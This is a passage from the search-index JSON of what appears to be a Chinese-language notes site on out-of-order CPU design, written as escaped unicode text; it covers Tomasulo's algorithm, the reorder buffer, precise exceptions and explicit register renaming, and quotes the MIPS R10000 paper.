<p>\u200b\u8fd9\u79cd\u200b\u65b9\u6cd5\u200b\u7684\u200b\u4e00\u4e2a\u200b\u6bd4\u8f83\u200b\u9ebb\u70e6\u200b\u7684\u200b\u70b9\u200b\u5728\u4e8e\u200b\u96be\u4ee5\u5b9e\u73b0\u200b\u7cbe\u786e\u200b\u5f02\u5e38\u200b\u3002\u200b\u7cbe\u786e\u200b\u5f02\u5e38\u200b\u7684\u200b\u5173\u952e\u5728\u4e8e\u200b\uff0c\u200b\u5f02\u5e38\u200b\u4e4b\u524d\u200b\u7684\u200b\u6307\u4ee4\u200b\u90fd\u200b\u751f\u6548\u200b\uff0c\u200b\u5f02\u5e38\u200b\u548c\u200b\u5f02\u5e38\u200b\u4e4b\u540e\u200b\u7684\u200b\u6307\u4ee4\u200b\u4e0d\u200b\u751f\u6548\u200b\uff0c\u200b\u4f46\u200b\u8fd9\u79cd\u200b\u65b9\u6cd5\u200b\u65e0\u6cd5\u200b\u8fdb\u884c\u200b\u533a\u5206\u200b\u3002</p> <p>\u200b\u4ece\u200b\u5bc4\u5b58\u5668\u200b\u91cd\u547d\u540d\u200b\u7684\u200b\u89d2\u5ea6\u200b\u6765\u770b\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b\u8fd9\u79cd\u200b\u65b9\u6cd5\u200b\u5c5e\u4e8e\u200b Implicit Register Renaming\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u628a\u200b Register \u200b\u91cd\u547d\u540d\u200b\u4e3a\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u7684\u200b ID\u3002</p> <p>\u200b\u518d\u200b\u5206\u6790\u200b\u4e00\u4e0b\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u9700\u8981\u200b\u54ea\u4e9b\u200b\u8bfb\u5199\u200b\u53e3\u200b\u3002\u200b\u6709\u200b\u4e00\u6761\u200b\u89c4\u5f8b\u200b\u662f\u200b\uff0c\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u7684\u200b\u9762\u79ef\u200b\u4e0e\u200b\u8bfb\u5199\u200b\u53e3\u200b\u4e2a\u6570\u200b\u7684\u200b\u5e73\u65b9\u200b\u6210\u6b63\u6bd4\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u6bcf\u6761\u200b\u53d1\u5c04\u200b\u7684\u200b\u6307\u4ee4\u200b\uff0c\u200b\u90fd\u200b\u9700\u8981\u200b\u4ece\u200b\u5bc4\u5b58\u5668\u200b\u5806\u8bfb\u200b\u64cd\u4f5c\u6570\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8bfb\u53e3\u200b\u662f\u200b\u64cd\u4f5c\u6570\u200b x \u200b\u6307\u4ee4\u200b\u53d1\u5c04\u200b\u6570\u200b\u3002\u200b\u5f53\u200b\u6267\u884c\u200b\u5355\u5143\u200b\u5b8c\u6210\u200b\u8ba1\u7b97\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u5199\u5165\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6bcf\u4e2a\u200b\u6267\u884c\u200b\u5355\u5143\u200b\u90fd\u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u7684\u200b\u5199\u53e3\u200b\u3002</p> <p>\u200b\u786c\u4ef6\u200b\u5b9e\u73b0\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u6027\u80fd\u200b\uff0c\u200b\u5e0c\u671b\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u53ef\u4ee5\u200b\u505a\u200b\u7684\u200b\u6bd4\u8f83\u200b\u591a\u200b\uff0c\u200b\u8fd9\u6837\u200b\u53ef\u4ee5\u200b\u5bb9\u7eb3\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u6307\u4ee4\u200b\u3002\u200b\u4f46\u662f\u200b\uff0c\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u91cc\u9762\u200b\u81f3\u5c11\u200b\u8981\u200b\u4fdd\u5b58\u200b\u64cd\u4f5c\u6570\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u4f1a\u200b\u6bd4\u8f83\u200b\u5360\u7528\u200b\u9762\u79ef\u200b\uff0c\u200b\u5e76\u4e14\u200b\u65f6\u5ef6\u200b\u4e5f\u200b\u6bd4\u8f83\u200b\u5927\u200b\u3002</p>"},{"location":"hardware/ooo_cpu.html#rob-reorder-buffer","title":"ROB (ReOrder Buffer)","text":"<p>\u200b\u53c2\u8003\u200b\u6559\u6750\u200b\uff1aStanford CS349G</p> <p>\u200b\u4e3a\u4e86\u200b\u5b9e\u73b0\u200b\u7cbe\u786e\u200b\u5f02\u5e38\u200b\uff0c\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u5f15\u5165\u200b ROB\u3002\u200b\u5728\u200b\u4e0a\u9762\u200b\u7684\u200b Tomasulo \u200b\u7b97\u6cd5\u200b\u4e2d\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\u8ba1\u7b97\u200b\u5b8c\u6210\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u628a\u200b\u7ed3\u679c\u200b\u5199\u5165\u200b\u5230\u200b\u5bc4\u5b58\u5668\u200b\u5806\u4e2d\u200b\uff0c\u200b\u56e0\u6b64\u200b\u7cbe\u786e\u200b\u5f02\u5e38\u200b\u65f6\u200b\u96be\u4ee5\u200b\u5f97\u5230\u200b\u6b63\u786e\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u53d6\u503c\u200b\u3002\u200b\u65e2\u7136\u200b\u6211\u4eec\u200b\u5e0c\u671b\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u7684\u200b\u72b6\u6001\u200b\u4e0e\u200b\u987a\u5e8f\u200b\u6267\u884c\u200b\u7684\u200b\u7ed3\u679c\u200b\u4e00\u81f4\u200b\uff0c\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u5f15\u5165\u200b ROB\u3002</p> <p>ROB \u200b\u5b9e\u9645\u4e0a\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u5faa\u73af\u200b\u961f\u5217\u200b\uff0c\u200b\u961f\u5217\u200b\u5934\u5c3e\u200b\u6307\u9488\u200b\u4e4b\u95f4\u200b\u5c31\u662f\u200b\u6b63\u5728\u200b\u6267\u884c\u200b\u7684\u200b\u6307\u4ee4\u200b\uff0c\u200b\u6bcf\u4e2a\u200b ROB \u200b\u8868\u9879\u200b\u8bb0\u5f55\u200b\u4e86\u200b\u6307\u4ee4\u200b\u7684\u200b\u72b6\u6001\u200b\u3001\u200b\u76ee\u7684\u200b\u5bc4\u5b58\u5668\u200b\u548c\u200b\u76ee\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5c06\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u503c\u200b\u3002ROB \u200b\u4f1a\u200b\u68c0\u67e5\u200b\u961f\u5217\u200b\u5934\u200b\u7684\u200b\u6307\u4ee4\u200b\uff0c\u200b\u5982\u679c\u200b\u5df2\u7ecf\u200b\u6267\u884c\u200b\u5b8c\u6210\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6ca1\u6709\u200b\u5f02\u5e38\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8ba9\u200b\u7ed3\u679c\u200b\u751f\u6548\u200b\uff0c\u200b\u5e76\u200b\u628a\u200b\u6307\u4ee4\u200b\u4ece\u200b\u961f\u5217\u200b\u5934\u200b\u4e2d\u200b\u5220\u53bb\u200b\uff0c\u200b\u7ee7\u7eed\u200b\u68c0\u67e5\u200b\u540e\u9762\u200b\u7684\u200b\u3002Decode \u200b\u51fa\u6765\u200b\u7684\u200b\u6307\u4ee4\u200b\u5219\u200b\u4f1a\u200b\u63d2\u5165\u200b\u5230\u200b ROB \u200b\u7684\u200b\u5c3e\u90e8\u200b\uff0c\u200b\u5e76\u4e14\u200b\u968f\u7740\u200b\u6307\u4ee4\u200b\u7684\u200b\u6267\u884c\u200b\u8fc7\u7a0b\u200b\u66f4\u65b0\u200b\u72b6\u6001\u200b\u3002\u200b\u9047\u5230\u200b\u5f02\u5e38\u200b\u7684\u200b\u6307\u4ee4\u200b\uff0c\u200b\u5c31\u200b\u628a\u200b\u961f\u5217\u200b\u4e2d\u200b\u7684\u200b\u6307\u4ee4\u200b\u3001\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u548c\u200b\u6267\u884c\u200b\u5355\u5143\u200b\u6e05\u7a7a\u200b\uff0c\u200b\u4ece\u200b\u5f02\u5e38\u200b\u5904\u7406\u200b\u5730\u5740\u200b\u5f00\u59cb\u200b\u91cd\u65b0\u200b\u6267\u884c\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u4fdd\u8bc1\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u7684\u200b\u6b63\u786e\u6027\u200b\uff0c\u200b\u8fd0\u7b97\u200b\u5355\u5143\u200b\u7684\u200b\u8fd0\u7b97\u200b\u7ed3\u679c\u200b\u4f1a\u200b\u5199\u5165\u200b ROB \u200b\u9879\u4e2d\u200b\uff0c\u200b\u5f53\u200b\u8fd9\u200b\u4e00\u9879\u200b\u5728\u200b ROB \u200b\u961f\u5217\u200b\u5934\u90e8\u200b\u88ab\u200b\u5220\u53bb\u200b\u65f6\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u5199\u5165\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u3002\u200b\u5728\u200b\u7ecf\u5178\u200b Tomasulo \u200b\u4e2d\u200b\uff0c\u200b\u5bc4\u5b58\u5668\u200b\u91cd\u547d\u540d\u200b\u4e3a\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u7684\u200b ID\uff0c\u200b\u4f46\u200b\u5728\u200b\u8fd9\u79cd\u200b\u8bbe\u8ba1\u200b\u4e2d\u200b\uff0c\u200b\u5e94\u8be5\u200b\u91cd\u547d\u540d\u200b\u4e3a\u200b ROB \u200b\u7684\u200b ID\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u9700\u8981\u200b\u7ef4\u62a4\u200b\u4e00\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\u5230\u200b ROB ID \u200b\u7684\u200b\u6620\u5c04\u200b\uff0c\u200b\u5f53\u200b\u6307\u4ee4\u200b\u8fdb\u5165\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u4ece\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u6216\u8005\u200b ROB \u200b\u4e2d\u200b\u53bb\u200b\u8bfb\u53d6\u200b\u64cd\u4f5c\u6570\u200b\u7684\u200b\u503c\u200b\u3002\u200b\u5728\u200b CDB \u200b\u4e0a\u200b\u5e7f\u64ad\u200b\u7684\u200b\u4e5f\u200b\u662f\u200b ROB \u200b\u7684\u200b ID\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u7684\u200b ID\u3002</p> <p>\u200b\u8fd9\u79cd\u200b\u65b9\u6cd5\u200b\u4e2d\u200b\uff0cROB \u200b\u7684\u200b\u5927\u5c0f\u200b\u6210\u4e3a\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b\u74f6\u9888\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u6bcf\u6761\u200b\u5728\u200b\u6b63\u5728\u200b\u6267\u884c\u200b\u7684\u200b\u6307\u4ee4\u200b\u90fd\u200b\u9700\u8981\u200b\u5728\u200b ROB \u200b\u4e2d\u200b\u8bb0\u5f55\u200b\u4e00\u4efd\u200b\u3002\u200b\u4e0d\u8fc7\u200b\u597d\u5904\u200b\u662f\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u7cbe\u786e\u200b\u5f02\u5e38\u200b\u3002</p>"},{"location":"hardware/ooo_cpu.html#explicit-register-renaming","title":"Explicit Register Renaming","text":"<p>\u200b\u4e0a\u9762\u200b\u4e24\u79cd\u200b\u8bbe\u8ba1\u200b\u90fd\u200b\u662f\u200b\u91c7\u7528\u200b\u7684\u200b Implicit Register Renaming \u200b\u7684\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u7b2c\u4e00\u79cd\u200b\u65b9\u6cd5\u200b\u91cd\u547d\u540d\u200b\u5230\u200b\u4e86\u200b\u4fdd\u7559\u200b\u7ad9\u200b\uff0c\u200b\u7b2c\u4e8c\u79cd\u200b\u65b9\u6cd5\u200b\u91cd\u547d\u540d\u200b\u5230\u200b\u4e86\u200b ROB\u3002\u200b\u8fd8\u6709\u200b\u4e00\u79cd\u200b\u8bbe\u8ba1\u200b\uff0c\u200b\u628a\u200b\u5bc4\u5b58\u5668\u200b\u7f16\u53f7\u200b\u6620\u5c04\u200b\u5230\u200b\u7269\u7406\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u3002\u200b\u628a\u200b ISA \u200b\u4e2d\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u79f0\u4e3a\u200b\u67b6\u6784\u200b\u5bc4\u5b58\u5668\u200b\uff08\u200b\u6bd4\u5982\u200b 32 \u200b\u4e2a\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b\uff09\uff0cCPU \u200b\u4e2d\u200b\u5b9e\u9645\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u79f0\u4e3a\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u4e00\u822c\u200b\u4f1a\u200b\u6bd4\u200b\u67b6\u6784\u200b\u5bc4\u5b58\u5668\u200b\u591a\u200b\u5f88\u591a\u200b\uff08\u200b\u4e00\u4e24\u767e\u4e2a\u200b\u751a\u81f3\u200b\u66f4\u200b\u591a\u200b\uff09\u3002</p> <p>Explicit Register Renaming \u200b\u548c\u200b ReOrder Buffer \u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u8bbe\u8ba1\u200b\u65b9\u5411\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u4f7f\u7528\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5355\u72ec\u200b\u4f7f\u7528\u200b\u3002</p> <p>\u200b\u6620\u5c04\u200b\u7684\u200b\u65b9\u6cd5\u200b\u548c\u200b\u524d\u9762\u200b\u7684\u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b\u7ef4\u62a4\u200b\u4e00\u4e2a\u200b mapping\uff0c\u200b\u4ece\u200b\u67b6\u6784\u200b\u5bc4\u5b58\u5668\u200b\u5230\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u3002\u200b\u5f53\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b Dispatch \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u64cd\u4f5c\u6570\u200b\u5728\u200b mapping \u200b\u4e2d\u200b\u627e\u5230\u200b\u5b9e\u9645\u200b\u7684\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u7f16\u53f7\u200b\u3002\u200b\u5982\u679c\u200b\u8fd9\u200b\u6761\u200b\u6307\u4ee4\u200b\u8981\u200b\u5199\u5165\u200b\u65b0\u200b\u7684\u200b\u67b6\u6784\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u5219\u200b\u4ece\u672a\u200b\u5206\u914d\u200b\u7684\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u4e2d\u200b\u5206\u914d\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u5e76\u4e14\u200b\u66f4\u65b0\u200b mapping\uff0c\u200b\u5373\u200b\u628a\u200b\u5199\u5165\u200b\u7684\u200b\u67b6\u6784\u200b\u5bc4\u5b58\u5668\u200b\u6620\u5c04\u200b\u5230\u200b\u65b0\u200b\u7684\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u4e0a\u200b\u3002\u200b\u7136\u540e\u200b\uff0c\u200b\u653e\u5230\u200b Issue Queue \u200b\u4e2d\u200b\u3002</p> <p>Issue Queue \u200b\u53ef\u4ee5\u200b\u7406\u89e3\u200b\u4e3a\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u7684\u200b\u7b80\u5316\u7248\u200b\uff0c\u200b\u5b83\u200b\u4e0d\u518d\u200b\u4fdd\u5b58\u200b\u64cd\u4f5c\u6570\u200b\u7684\u200b\u53d6\u503c\u200b\uff0c\u200b\u800c\u200b\u4ec5\u4ec5\u200b\u7ef4\u62a4\u200b\u64cd\u4f5c\u6570\u200b\u662f\u5426\u200b ready\u3002\u200b\u540e\u9762\u200b\u89e3\u91ca\u200b\u4e3a\u4ec0\u4e48\u200b\u4e0d\u200b\u9700\u8981\u200b\u4fdd\u5b58\u200b\u64cd\u4f5c\u6570\u200b\u7684\u200b\u53d6\u503c\u200b\u3002\u200b\u5728\u200b Issue Queue \u200b\u4e2d\u200b\u7684\u200b\u6307\u4ee4\u200b\u5728\u200b\u6240\u6709\u200b\u64cd\u4f5c\u6570\u200b\u90fd\u200b ready \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5219\u200b\u4f1a\u200b Issue \u200b\u5230\u200b\u4e0d\u540c\u200b\u7684\u200b\u7aef\u53e3\u200b\u4e2d\u200b\u3002\u200b\u6bcf\u4e2a\u200b\u7aef\u53e3\u200b\u5bf9\u5e94\u200b\u7740\u200b\u4e00\u4e2a\u200b\u6267\u884c\u200b\u5355\u5143\u200b\uff0c\u200b\u6bd4\u5982\u200b\u4e24\u4e2a\u200b ALU \u200b\u7aef\u53e3\u200b\u5206\u522b\u200b\u5bf9\u5e94\u200b\u4e24\u4e2a\u200b ALU \u200b\u6267\u884c\u200b\u5355\u5143\u200b\u3002\u200b\u6307\u4ee4\u200b\u9996\u5148\u200b\u901a\u8fc7\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff0c\u200b\u4ee5\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u4e3a\u200b\u7f16\u53f7\u200b\u53bb\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u7136\u540e\u200b\u8fd9\u4e2a\u200b\u503c\u200b\u76f4\u63a5\u200b\u4f20\u7ed9\u200b\u6267\u884c\u200b\u5355\u5143\u200b\uff0c\u200b\u4e0d\u4f1a\u200b\u5b58\u200b\u4e0b\u6765\u200b\u3002\u200b\u5f53\u200b\u6267\u884c\u200b\u5355\u5143\u200b\u6267\u884c\u200b\u5b8c\u6bd5\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7ed3\u679c\u200b\u4e5f\u200b\u662f\u200b\u5199\u200b\u5230\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u5806\u4e2d\u200b\uff0cROB \u200b\u4e0d\u200b\u4fdd\u5b58\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u8bbe\u8ba1\u200b\u4e2d\u200b\uff0c\u200b\u503c\u4ec5\u200b\u4fdd\u5b58\u200b\u5728\u200b\u5bc4\u5b58\u5668\u200b\u5806\u4e2d\u200b\uff0cIssue Queue \u200b\u548c\u200b ROB \u200b\u90fd\u200b\u53ea\u200b\u4fdd\u5b58\u200b\u4e00\u4e9b\u200b\u72b6\u6001\u200b\u4f4d\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5b83\u4eec\u200b\u53ef\u4ee5\u200b\u505a\u200b\u7684\u200b\u5f88\u5927\u200b\uff0c\u200b\u5178\u578b\u200b\u7684\u200b Issue Queue \u200b\u6709\u200b\u51e0\u5341\u9879\u200b\uff0cROB \u200b\u5219\u200b\u6709\u200b\u51e0\u767e\u200b\u9879\u200b\u3002</p> <p>\u200b\u63a5\u4e0b\u6765\u200b\u8ba8\u8bba\u200b\u4e00\u4e9b\u200b\u7ec6\u8282\u200b\u3002\u200b\u9996\u5148\u200b\u662f\u200b\uff0c\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u4f55\u65f6\u200b\u91ca\u653e\u200b\u3002\u200b\u5f53\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u5199\u5165\u200b\u4e00\u4e2a\u200b\u67b6\u6784\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5728\u200b\u4e0b\u200b\u4e00\u6b21\u200b\u8fd9\u4e2a\u200b\u67b6\u6784\u200b\u5bc4\u5b58\u5668\u200b\u88ab\u200b\u5199\u5165\u200b\u4e4b\u524d\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u503c\u200b\u90fd\u200b\u6709\u200b\u53ef\u80fd\u200b\u88ab\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8fd9\u4e2a\u200b\u67b6\u6784\u200b\u5bc4\u5b58\u5668\u200b\u5230\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u6620\u5c04\u200b\u8981\u200b\u4fdd\u7559\u200b\u3002\u200b\u5982\u679c\u200b\u6211\u4eec\u200b\u80fd\u200b\u4fdd\u8bc1\u200b\u8bfb\u53d6\u200b\u8fd9\u4e2a\u200b\u503c\u200b\u7684\u200b\u6307\u4ee4\u200b\u90fd\u200b\u5df2\u7ecf\u200b\u5b8c\u6210\u200b\uff0c\u200b\u6211\u4eec\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u91ca\u653e\u200b\u8fd9\u4e2a\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u4e86\u200b\u3002\u200b\u4e00\u4e2a\u200b\u65b9\u6cd5\u200b\u662f\u200b\uff0c\u200b\u6211\u200b\u5728\u200b\u8986\u76d6\u200b\u67b6\u6784\u200b\u5bc4\u5b58\u5668\u200b\u5230\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u6620\u5c04\u200b\u65f6\u200b\uff0c\u200b\u6211\u200b\u8fd8\u8981\u200b\u8bb0\u5f55\u200b\u539f\u6765\u200b\u7684\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u5f53\u8be5\u200b\u6307\u4ee4\u200b\u5728\u200b ROB \u200b\u4e2d\u200b\u63d0\u4ea4\u200b\u4e86\u200b\uff08\u200b\u4ece\u961f\u200b\u5934\u200b\u51fa\u53bb\u200b\u4e86\u200b\uff09\uff0c\u200b\u8bf4\u660e\u200b\u4e4b\u524d\u200b\u53ef\u80fd\u200b\u4f9d\u8d56\u200b\u8fd9\u4e2a\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u6240\u6709\u200b\u6307\u4ee4\u200b\u90fd\u200b\u5b8c\u6210\u200b\u4e86\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u628a\u200b\u539f\u6765\u200b\u7684\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u653e\u5230\u200b\u672a\u200b\u6620\u5c04\u200b\u7684\u200b\u5217\u8868\u200b\u4e2d\u200b\u3002</p> <p>\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b\u95ee\u9898\u200b\uff0c\u200b\u5c31\u662f\u200b\u5728\u200b\u9047\u5230\u200b\u5f02\u5e38\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u4f55\u200b\u6062\u590d\u200b\u5728\u200b\u5f02\u5e38\u200b\u6307\u4ee4\u200b\u5904\u200b\u7684\u200b\u67b6\u6784\u200b\u5bc4\u5b58\u5668\u200b\u5230\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u6620\u5c04\u200b\u5462\u200b\uff1f\u200b\u4e00\u4e2a\u200b\u529e\u6cd5\u200b\u662f\u200b\uff0c\u200b\u5229\u7528\u200b\u6211\u200b\u5728\u200b ROB \u200b\u4e2d\u200b\u8bb0\u5f55\u200b\u7684\u200b\u88ab\u200b\u8986\u76d6\u200b\u7684\u200b\u7269\u7406\u200b\u5bc4\u5b58\u5668\u200b\u7f16\u53f7\u200b\uff0c\u200b\u4ece\u200b ROB \u200b\u961f\u5c3e\u200b\u5f80\u524d\u200b\u56de\u6eda\u200b\uff0c\u200b\u5f53\u200b\u53d1\u73b0\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u8986\u76d6\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u67b6\u6784\u200b\u5bc4\u5b58\u5668\u200b\u6620\u5c04\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u6062\u590d\u200b\u4e3a\u200b\u8986\u76d6\u200b\u4e4b\u524d\u200b\u7684\u200b\u503c\u200b\u3002\u200b\u8fd9\u6837\u200b\uff0c\u200b\u5f53\u56de\u200b\u6eda\u200b\u5230\u200b\u5f02\u5e38\u200b\u6307\u4ee4\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u5f97\u5230\u200b\u6b63\u786e\u200b\u7684\u200b\u6620\u5c04\u200b\u3002MIPS R10K \u200b\u7684\u200b\u8bba\u6587\u200b\u4e2d\u662f\u200b\u8fd9\u4e48\u200b\u63cf\u8ff0\u200b\u7684\u200b\uff1a</p> <pre><code>The active list contains the logical-destination register number and its\nold physical-register number for each instruction. An instruction's\ngraduation commits its new mapping, so the old physical register can\nreturn to the free list for reuse. When an exception occurs, however,\nsubsequent instructions never graduate. Instead, the processor restores\nold mappings from the active list. The R1OOOO unmaps four instructions\nper cycle--in reverse order, in case it renamed the same logical\nregister twice. Although this is slower than restoring a branch,\nexceptions are much rarer than mispredicted branches. The processor\nreturns new physical registers to the free lists by restoring their read\npointers.\n</code></pre> <p>\u200b\u53e6\u200b\u4e00\u79cd\u200b\u529e\u6cd5\u200b\u662f\u200b\u8bb0\u5f55\u200b\u4e00\u4e2a\u200b Committed Map Table\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\uff0c\u200b\u53ea\u6709\u200b\u5f53\u200b ROB Head \u200b\u7684\u200b\u6307\u4ee4\u200b\u88ab\u200b Commit \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u624d\u200b\u66f4\u65b0\u200b Committed Map Table\uff0c\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b\u662f\u200b\u987a\u5e8f\u200b\u6267\u884c\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u6620\u5c04\u200b\u8868\u200b\u3002\u200b\u5f53\u200b\u53d1\u751f\u200b\u5f02\u5e38\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u628a\u200b Committed Map Table \u200b\u8986\u76d6\u200b\u5230\u200b Register Map Table \u200b\u4e0a\u200b\u3002\u200b\u8fd9\u6837\u200b\u9700\u8981\u200b\u7684\u200b\u5468\u671f\u200b\u6bd4\u8f83\u200b\u5c11\u200b\uff0c\u200b\u4f46\u662f\u200b\u65f6\u5e8f\u200b\u53ef\u80fd\u200b\u6bd4\u8f83\u200b\u5dee\u200b\u3002\u200b\u53c2\u8003\u200b BOOM \u200b\u6587\u6863\u200b\u3002</p>"},{"location":"hardware/ooo_cpu.html#implicit-renamingrob-explicit-renaming","title":"Implicit Renaming(ROB) \u200b\u548c\u200b Explicit Renaming \u200b\u7684\u200b\u6bd4\u8f83","text":"<p>\u200b\u8fd9\u200b\u4e24\u79cd\u200b\u65b9\u6cd5\u200b\u4e3b\u8981\u200b\u533a\u522b\u200b\uff1a</p> <ol> <li>Implicit Renaming \u200b\u5728\u200b\u5206\u53d1\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u4ece\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u4fdd\u5b58\u200b\u5230\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u4e2d\u200b\uff1b\u200b\u800c\u200b Explicit Renaming \u200b\u662f\u200b\u6307\u4ee4\u200b\u4ece\u200b Issue Queue \u200b\u5230\u200b\u6267\u884c\u200b\u5355\u5143\u200b\u65f6\u5019\u200b\u4ece\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u8bfb\u53d6\u6570\u636e\u200b</li> <li>Implicit Renaming \u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u8bfb\u53d6\u200b\u53e3\u8f83\u200b\u5c11\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u53d1\u5c04\u200b\u6570\u200b\u4e58\u4ee5\u200b\u64cd\u4f5c\u6570\u200b\u4e2a\u6570\u200b\uff0c\u200b\u4f46\u200b\u6240\u6709\u200b\u7c7b\u578b\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff08\u200b\u6574\u6570\u200b\u3001\u200b\u6d6e\u70b9\u200b\uff09\u200b\u90fd\u200b\u9700\u8981\u200b\u8bfb\u53d6\u200b\uff1bExplicit Renaming 